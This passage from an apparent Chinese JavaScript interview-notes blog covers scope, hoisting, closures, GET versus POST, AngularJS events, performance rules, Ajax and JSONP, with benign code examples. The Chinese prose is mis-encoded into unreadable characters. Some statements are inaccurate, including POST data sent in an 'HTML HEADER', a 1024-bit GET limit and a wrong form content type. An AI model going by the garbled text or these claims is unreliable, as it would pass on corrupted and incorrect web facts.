</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> b = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> b = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(a);    <span class="comment">// 2</span></span><br><span class="line">    <span class="built_in">console</span>.log(b);    <span class="comment">// 1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> b = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> a = <span class="number">2</span>; <span class="literal">false</span>;)&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> b = <span class="number">2</span>; <span class="literal">false</span>;)&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(a);    <span class="comment">// 2</span></span><br><span class="line">    <span class="built_in">console</span>.log(b);    <span class="comment">// 1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> b = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> b = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(a);    <span class="comment">// 2</span></span><br><span class="line"><span class="built_in">console</span>.log(b);    <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><p>ç®€è€Œè¨€ä¹‹ï¼Œå³æ˜¯ <code>var</code> çš„ä½œç”¨åŸŸåœ¨å…¶æœ€è¿‘çš„å‡½æ•°ä½“å†…ï¼Œ<code>let</code> çš„ä½œç”¨åŸŸåœ¨å…¶æœ€è¿‘çš„ä»£ç å—å†…ã€‚</p><h4 id="ä¸¤ç§ä¸åŒçš„å‡½æ•°å£°æ˜æ–¹å¼åŒºåˆ«"><a href="#ä¸¤ç§ä¸åŒçš„å‡½æ•°å£°æ˜æ–¹å¼åŒºåˆ«" class="headerlink" title="ä¸¤ç§ä¸åŒçš„å‡½æ•°å£°æ˜æ–¹å¼åŒºåˆ«"></a>ä¸¤ç§ä¸åŒçš„å‡½æ•°å£°æ˜æ–¹å¼åŒºåˆ«</h4><p><strong>JavaScript</strong> æœ‰ä¸¤ç§å‡½æ•°å£°æ˜æ–¹å¼ï¼Œ<code>var fn = function(){}</code> å’Œ <code>function fn(){}</code>ï¼Œå‰è€…æ˜¯è¿è¡Œæ—¶å®šä¹‰ï¼Œåè€…æ˜¯ç¼–è¯‘æ—¶å®šä¹‰ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">foo();    <span class="comment">// no error</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">bar();    <span class="comment">// error: bar is not a function</span></span><br><span class="line"><span class="keyword">let</span> bar = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</span><br></pre></td></tr></table></figure><h4 id="å˜é‡æå‡"><a href="#å˜é‡æå‡" class="headerlink" title="å˜é‡æå‡"></a>å˜é‡æå‡</h4><p>åœ¨ä¸€ä¸ª<code>var</code>ä½œç”¨åŸŸå†…éå­ä½œç”¨åŸŸå†…å£°æ˜ä¸€ä¸ªå˜é‡ï¼Œé‚£ä¹ˆåœ¨è¯¥å˜é‡è¢«å£°æ˜ä¹‹å‰çš„åŒåå˜é‡ä¼šåˆå§‹åŒ–ä¸º <code>undefiend</code>ï¼Œæ­¤æ—¶å¤–éƒ¨ä½œç”¨åŸŸåŒåå˜é‡å°†ä¸å†ä½œç”¨äºä½œç”¨åŸŸå†…éƒ¨åŒåå˜é‡ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(foo);    <span class="comment">// undefined</span></span><br><span class="line">    <span class="keyword">var</span> foo = <span class="number">2</span>;</span><br><span class="line">    foo++;</span><br><span class="line">&#125;</span><br><span class="line">fn1();</span><br><span class="line"><span class="built_in">console</span>.log(foo);    <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><h4 id="GET-å’Œ-POST-åŒºåˆ«"><a href="#GET-å’Œ-POST-åŒºåˆ«" class="headerlink" title="GET å’Œ POST åŒºåˆ«"></a>GET å’Œ POST åŒºåˆ«</h4><ul><li>GET ç”¨äºä»æœåŠ¡å™¨å–å‡ºæ•°æ®</li><li>POST ç”¨äºæ”¹å˜æœåŠ¡å™¨çš„æ•°æ®</li><li>åœ¨å®¢æˆ·ç«¯ï¼ŒGET æ–¹å¼é€šè¿‡ URL æäº¤æ•°æ®ï¼Œæ•°æ®åœ¨ URL ä¸­å¯ä»¥çœ‹åˆ°ï¼›POST æ–¹å¼ï¼Œæ•°æ®æ”¾åœ¨ HTML HEADER å†…æäº¤ã€‚</li><li>GET æäº¤æ•°æ®æœ€å¤šä¸º 1024 Bitsï¼ŒPOST åˆ™æ— é™åˆ¶</li></ul><h5 id="GET-çš„ç‰¹æ€§"><a href="#GET-çš„ç‰¹æ€§" class="headerlink" title="GET çš„ç‰¹æ€§"></a>GET çš„ç‰¹æ€§</h5><ul><li>GET ç”¨äºå®‰å…¨è¡Œä¸ºï¼ŒPOST ç”¨äºä¸å®‰å…¨è¡Œä¸º</li><li>GET è¯·æ±‚å¯ä»¥è¢«ç¼“å­˜</li><li>GET è¯·æ±‚ä¼šç•™åœ¨æµè§ˆå™¨å†å²é‡Œ</li><li>GET å¯ä»¥ä½œä¸ºä¹¦ç­¾ä¿å­˜</li><li>GET é“¾æ¥å¯ä»¥åˆ†äº«</li><li>GET å¯ä»¥ç”¨äº hack</li></ul><h5 id="ç”¨-POST-çš„æƒ…å†µ"><a href="#ç”¨-POST-çš„æƒ…å†µ" class="headerlink" title="ç”¨ POST çš„æƒ…å†µ"></a>ç”¨ POST çš„æƒ…å†µ</h5><ul><li>ä¿®æ”¹æœåŠ¡å™¨æ•°æ®</li><li>æ•æ„Ÿä¿¡æ¯</li><li>é•¿æ•°æ®ï¼Œå¤šæ•°æ®</li></ul><h4 id="AngularJS-æ§åˆ¶å™¨é—´æ•°æ®å…±äº«"><a href="#AngularJS-æ§åˆ¶å™¨é—´æ•°æ®å…±äº«" class="headerlink" title="AngularJS æ§åˆ¶å™¨é—´æ•°æ®å…±äº«"></a>AngularJS æ§åˆ¶å™¨é—´æ•°æ®å…±äº«</h4><p>å…³é”®è¯ï¼š<code>$emit</code>, <code>$broadcast</code>, <code>$on</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">angular.module(<span class="string">'app'</span>, [])</span><br><span class="line">    .controller(<span class="string">'parentCtrl'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">$scope</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// ç›‘å¬å­æ§åˆ¶å™¨æ³¨å†Œäº‹ä»¶</span></span><br><span class="line">        $scope.$on(<span class="string">'CtrlNameChange'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event, msg</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// å¹¿æ’­ç»™æ‰€æœ‰å­æ§åˆ¶å™¨</span></span><br><span class="line">            $scope.$broadcast(<span class="string">'CtrlNameChangeBroadcastFromParent'</span>, msg)</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .controller(<span class="string">'ChildCtrl1'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">$scope</span>) </span>&#123;</span><br><span class="line">        $scope.change = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// å†’æ³¡åˆ°çˆ¶æ§åˆ¶å™¨</span></span><br><span class="line">            $scope.$emit(<span class="string">'CtrlNameChange'</span>, name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    .controller(<span class="string">'ChildCtrl2'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">$scope</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// ç›‘å¬çˆ¶æ§åˆ¶å™¨å¹¿æ’­äº‹ä»¶</span></span><br><span class="line">        $scope.$on(<span class="string">'CtrlNameChangeBroadcastFromParent'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event, msg</span>) </span>&#123;</span><br><span class="line">            $scope.ctrlName = msg;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><h4 id="é—­åˆå‡½æ•°"><a href="#é—­åˆå‡½æ•°" class="headerlink" title="é—­åˆå‡½æ•°"></a>é—­åˆå‡½æ•°</h4><h5 id="ä»€ä¹ˆæ˜¯é—­åˆå‡½æ•°"><a href="#ä»€ä¹ˆæ˜¯é—­åˆå‡½æ•°" class="headerlink" title="ä»€ä¹ˆæ˜¯é—­åˆå‡½æ•°"></a>ä»€ä¹ˆæ˜¯é—­åˆå‡½æ•°</h5><ul><li>ä¸€ä¸ªä»£è¡¨å‡½æ•°çš„å˜é‡(åœ¨å‡½æ•°ç»“æŸä¹‹åä»å¯è®¿é—®)æˆ–ä¸€ä¸ªæŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆ</li><li>åœ¨å‡½æ•°ç»“æŸä¹‹åå…¶ç©ºé—´å¹¶æœªè¢«é‡Šæ”¾è€Œæ˜¯è¢«æ”¾åœ¨å †ç»“æ„å†…æä¾›è®¿é—®éœ€è¦</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> greet = <span class="string">'Hello world'</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(greet);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> bar = foo();</span><br><span class="line">bar();  <span class="comment">// "Hello world";</span></span><br></pre></td></tr></table></figure><p>ä»¥ä¸Š <code>foo</code> å‡½æ•°åŒ…å«äº†ä¸€ä¸ªé—­åˆï¼Œå› ä¸ºå…¶å†…éƒ¨å®šä¹‰äº†ä¸€ä¸ªåŒ¿åå‡½æ•° <code>function() { console.log(greet); }</code>ï¼Œä¸€æ—¦ä½ åœ¨ä¸€ä¸ªå‡½æ•°å†…ä½¿ç”¨äº† <code>function</code> å…³é”®è¯ï¼Œä½ å°±åˆ›é€ äº†ä¸€ä¸ªé—­åˆã€‚</p><p>åœ¨é—­åˆå‡½æ•°ä¸­ï¼Œå‡½æ•°è¿è¡Œå®Œæ¯•åä¸ä¼šè¢«ç«‹å³é‡Šæ”¾å†…å­˜ï¼Œè€Œæ˜¯ä¿ç•™äº†å…¶å¼•ç”¨(reference)ï¼Œè¿™æ˜¯å…¶å’Œ <code>C</code> è¯­è¨€æˆ–å…¶ä»–ç±»ä¼¼è¯­è¨€ä¸åŒçš„ã€‚</p><p>é—­åˆå‡½æ•°åªæ˜¯å¼•ç”¨ï¼Œä¸æ˜¯å¤åˆ¶ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> inner =  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(a);</span><br><span class="line">    &#125;;</span><br><span class="line">    a++;</span><br><span class="line">    <span class="keyword">return</span> inner;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> bar = foo();</span><br><span class="line">bar();  <span class="comment">// 2;</span></span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹ä¸§å¿ƒç—…ç‹‚ä¾‹å­æ¥è‡ª <a href="http://stackoverflow.com/questions/111102/how-do-javascript-closures-work" target="_blank" rel="noopener">stackoverflow</a>ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setupSomeGlobals</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Local variable that ends up within closure</span></span><br><span class="line">    <span class="keyword">var</span> num = <span class="number">666</span>;</span><br><span class="line">    <span class="comment">// Store some references to functions as global variables</span></span><br><span class="line">    gAlertNumber = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; alert(num); &#125;</span><br><span class="line">    gIncreaseNumber = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; num++; &#125;</span><br><span class="line">    gSetNumber = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123; num = x; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setupSomeGlobals();</span><br><span class="line">gIncreaseNumber();</span><br><span class="line">gAlertNumber(); <span class="comment">// 667</span></span><br><span class="line">gSetNumber(<span class="number">5</span>);</span><br><span class="line">gAlertNumber(); <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> oldAlert = gAlertNumber;</span><br><span class="line"></span><br><span class="line">setupSomeGlobals();</span><br><span class="line">gAlertNumber(); <span class="comment">// 666</span></span><br><span class="line"></span><br><span class="line">oldAlert() <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*********************************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buildList</span>(<span class="params">list</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; list.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> item = <span class="string">'item'</span> + list[i];</span><br><span class="line">        result.push( <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(item + <span class="string">' '</span> + list[i])&#125; );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testList</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> fnlist = buildList([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]);</span><br><span class="line">    <span class="comment">// Using j only to help prevent confusion -- could use i.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; fnlist.length; j++) &#123;</span><br><span class="line">        fnlist[j]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">testList();    <span class="comment">// "item3 undefined" for 3 times</span></span><br><span class="line"><span class="comment">// because closure is a reference, when the loop in buildList() is complete, i has turned to 3, so list[3] is undefined.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayAlice</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> sayAlert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; alert(alice); &#125;</span><br><span class="line">    <span class="comment">// Local variable that ends up within closure</span></span><br><span class="line">    <span class="keyword">var</span> alice = <span class="string">'Hello Alice'</span>;</span><br><span class="line">    <span class="keyword">return</span> sayAlert;</span><br><span class="line">&#125;</span><br><span class="line">sayAlice()();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*********************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">newClosure</span>(<span class="params">someNum, someRef</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Local variables that end up within closure</span></span><br><span class="line">    <span class="keyword">var</span> num = someNum;</span><br><span class="line">    <span class="keyword">var</span> anArray = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">var</span> ref = someRef;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">        num += x;</span><br><span class="line">        anArray.push(num);</span><br><span class="line">        alert(<span class="string">'num: '</span> + num +</span><br><span class="line">            <span class="string">'\nanArray '</span> + anArray.toString() +</span><br><span class="line">            <span class="string">'\nref.someVar '</span> + ref.someVar);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">obj = &#123;<span class="attr">someVar</span>: <span class="number">4</span>&#125;;</span><br><span class="line">fn1 = newClosure(<span class="number">4</span>, obj);</span><br><span class="line">fn2 = newClosure(<span class="number">5</span>, obj);</span><br><span class="line">fn1(<span class="number">1</span>); <span class="comment">// num: 5; anArray: 1,2,3,5; ref.someVar: 4;</span></span><br><span class="line">fn2(<span class="number">1</span>); <span class="comment">// num: 6; anArray: 1,2,3,6; ref.someVar: 4;</span></span><br><span class="line">obj.someVar++;</span><br><span class="line">fn1(<span class="number">2</span>); <span class="comment">// num: 7; anArray: 1,2,3,5,7; ref.someVar: 5;</span></span><br><span class="line">fn2(<span class="number">2</span>); <span class="comment">// num: 8; anArray: 1,2,3,6,8; ref.someVar: 5;</span></span><br></pre></td></tr></table></figure><h4 id="å‰ç«¯æ€§èƒ½ä¼˜åŒ–"><a href="#å‰ç«¯æ€§èƒ½ä¼˜åŒ–" class="headerlink" title="å‰ç«¯æ€§èƒ½ä¼˜åŒ–"></a>å‰ç«¯æ€§èƒ½ä¼˜åŒ–</h4><p>æƒå¨å‘å¸ƒï¼š<a href="https://developer.yahoo.com/performance/rules.html" target="_blank" rel="noopener">Best Practices for Speeding Up Your Web Site</a></p><p>æ¥è‡ªï¼š<a href="https://github.com/fouber/blog/issues/3#issuecomment-150230758" target="_blank" rel="noopener">å‰ç«¯å·¥ç¨‹ä¸æ€§èƒ½ä¼˜åŒ– â€“ fouber</a></p><table><thead><tr><th>ä¼˜åŒ–æ–¹å‘</th><th>ä¼˜åŒ–æ‰‹æ®µ</th></tr></thead><tbody><tr><td>è¯·æ±‚æ•°é‡</td><td>åˆå¹¶è„šæœ¬å’Œæ ·å¼è¡¨ï¼ŒCSS Spritesï¼Œæ‹†åˆ†åˆå§‹åŒ–è´Ÿè½½ï¼Œåˆ’åˆ†ä¸»åŸŸï¼Œwebpack</td></tr><tr><td>è¯·æ±‚å¸¦å®½</td><td>å¼€å¯GZipï¼Œç²¾ç®€JavaScriptï¼Œç§»é™¤é‡å¤è„šæœ¬ï¼Œå›¾åƒä¼˜åŒ–</td></tr><tr><td>ç¼“å­˜åˆ©ç”¨</td><td>ä½¿ç”¨CDNï¼Œä½¿ç”¨å¤–éƒ¨JavaScriptå’ŒCSSï¼Œæ·»åŠ Expireså¤´ï¼Œå‡å°‘DNSæŸ¥æ‰¾ï¼Œé…ç½®ETagï¼Œä½¿AjaXå¯ç¼“å­˜</td></tr><tr><td>é¡µé¢ç»“æ„</td><td>å°†æ ·å¼è¡¨æ”¾åœ¨é¡¶éƒ¨ï¼Œå°†è„šæœ¬æ”¾åœ¨åº•éƒ¨ï¼Œå°½æ—©åˆ·æ–°æ–‡æ¡£çš„è¾“å‡º</td></tr><tr><td>ä»£ç æ ¡éªŒ</td><td>é¿å…CSSè¡¨è¾¾å¼ï¼Œé¿å…é‡å®šå‘</td></tr></tbody></table><p>ä»€ä¹ˆæ˜¯ CSS è¡¨è¾¾å¼ï¼Œæ¯”å¦‚è¿™ä¸ªï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">expression</span>((new Date()).<span class="built_in">getHours</span>()%<span class="number">2</span> ? <span class="string">"#B8D4FF"</span> : <span class="string">"#F08A00"</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ç§å†™æ³•å§‹äº IE5ï¼Œç»ˆäº IE8ï¼Œè§£é‡Šï¼š <a href="http://blogs.msdn.com/b/ie/archive/2008/10/16/ending-expressions.aspx" target="_blank" rel="noopener">Ending Expressions</a>ã€‚</p><h4 id="å–æ¶ˆä¸€ä¸ª-Ajax-è¯·æ±‚"><a href="#å–æ¶ˆä¸€ä¸ª-Ajax-è¯·æ±‚" class="headerlink" title="å–æ¶ˆä¸€ä¸ª Ajax è¯·æ±‚"></a>å–æ¶ˆä¸€ä¸ª Ajax è¯·æ±‚</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xmlHttp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">    xmlHttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    xmlHttp = <span class="keyword">new</span> ActiveXObject(<span class="string">'Msxml2.XMLHTTP'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        xmlHttp = <span class="keyword">new</span> ActiveXObject(<span class="string">'Microsoft.XMLHttp'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!xmlHttp) &#123;</span><br><span class="line">    <span class="built_in">console</span>.error(<span class="string">'Your browser don\'t support XMLHttp Object'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">xmlHttp.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (xmlHttp.readyState === <span class="number">4</span> &amp;&amp; xmlHttp.status === <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(xmlHttp.responseText/responseJSON/responseXML/response);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.error(<span class="string">'error'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="built_in">console</span>.error(e.description);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xmlHttp.open(<span class="string">'POST'</span>, url, <span class="literal">true</span>);</span><br><span class="line">xmlHttp.setRequestHeader(<span class="string">'Content-Type'</span>, <span class="string">'application/x-www-form-data'</span>);</span><br><span class="line">xmlHttp.send(<span class="string">'a=2&amp;b=1'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (xmlHttp.readyState === <span class="number">3</span>) xmlHttp.abort();</span><br></pre></td></tr></table></figure><h4 id="script-å±æ€§-async-defer-åŒºåˆ«"><a href="#script-å±æ€§-async-defer-åŒºåˆ«" class="headerlink" title="script å±æ€§ async, defer åŒºåˆ«"></a>script å±æ€§ async, defer åŒºåˆ«</h4><p><code>&lt;script&gt;&lt;/script&gt;;</code> åŒæ­¥åŠ è½½ï¼Œåœ¨æµè§ˆå™¨è§£æ DOM ä¹‹å‰åŠ è½½ï¼Œå¯èƒ½ä¼šå µå¡çº¿ç¨‹</p><p><code>&lt;script async&gt;&lt;/script&gt;</code> å¼‚æ­¥åŠ è½½ï¼Œåœ¨æµè§ˆå™¨è§£æ DOM çš„åŒæ—¶åŠ è½½</p><p><code>&lt;script defer&gt;&lt;/script&gt;</code> åœ¨æµè§ˆå™¨è§£æ DOM å®Œæˆä¹‹ååŠ è½½</p><h4 id="JSONP-è·¨åŸŸçš„åŸç†"><a href="#JSONP-è·¨åŸŸçš„åŸç†" class="headerlink" title="JSONP è·¨åŸŸçš„åŸç†"></a>JSONP è·¨åŸŸçš„åŸç†</h4><p>åŠ¨æ€æ·»åŠ ä¸€ä¸ª <code>script</code> æ ‡ç­¾ï¼Œ<code>sciprt</code> å†…çš„ <code>scr</code> å±æ€§æ˜¯ä¸å—åŒæºç­–ç•¥å½±å“çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ JSONP çš„æ–¹å¼å’Œ <code>Ajax</code> åè®®æ˜¯æ²¡æœ‰å…³ç³»çš„ï¼Œè¿™å’Œ <code>&lt;image src&gt;</code> æ˜¯åŒæ ·é“ç†ã€‚</p><h4 id="Redux-æœ€é‡è¦çš„å‡ ä¸ªæ¦‚å¿µ"><a href="#Redux-æœ€é‡è¦çš„å‡ ä¸ªæ¦‚å¿µ" class="headerlink" title="Redux æœ€é‡è¦çš„å‡ ä¸ªæ¦‚å¿µ"></a>Redux æœ€é‡è¦çš„å‡ ä¸ªæ¦‚å¿µ</h4><p><a href="http://redux.js.org/docs/api/Store.html" target="_blank" rel="noopener">store</a>, <strong>state</strong>, <strong>dispatch</strong></p><h4 id="HTTP-è¯·æ±‚æ–¹æ³•"><a href="#HTTP-è¯·æ±‚æ–¹æ³•" class="headerlink" title="HTTP è¯·æ±‚æ–¹æ³•"></a>HTTP 